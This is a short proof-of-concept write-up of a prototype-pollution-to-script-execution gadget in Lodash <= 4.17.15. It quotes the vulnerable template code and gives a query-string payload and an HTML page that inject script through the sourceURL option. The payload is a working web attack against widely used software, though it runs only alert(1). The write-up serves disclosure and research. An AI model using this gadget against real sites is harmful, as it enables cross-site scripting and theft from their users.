## Lodash <= 4.17.15

URL: https://lodash.com/

### Vulnerable code fragment
https://github.com/lodash/lodash/blob/ddfd9b11a0126db2302cb70ec9973b66baec0975/lodash.js#L14804-L14872
```js
var sourceURL = '//# sourceURL=' +
  (hasOwnProperty.call(options, 'sourceURL')
    ? (options.sourceURL + '').replace(/[\r\n]/g, ' ')
    : ('lodash.templateSources[' + (++templateCounter) + ']')
  ) + '\n';

...

var result = attempt(function() {
  return Function(importsKeys, sourceURL + 'return ' + source)
    .apply(undefined, importsValues);
});
```

### PoC

```
?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)
```

```html
<script/src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.15/lodash.min.js"></script>
<script>
  Object.prototype.sourceURL = '\u2028\u2029alert(1)'
</script>
<script>
  _.template('test')
</script>
```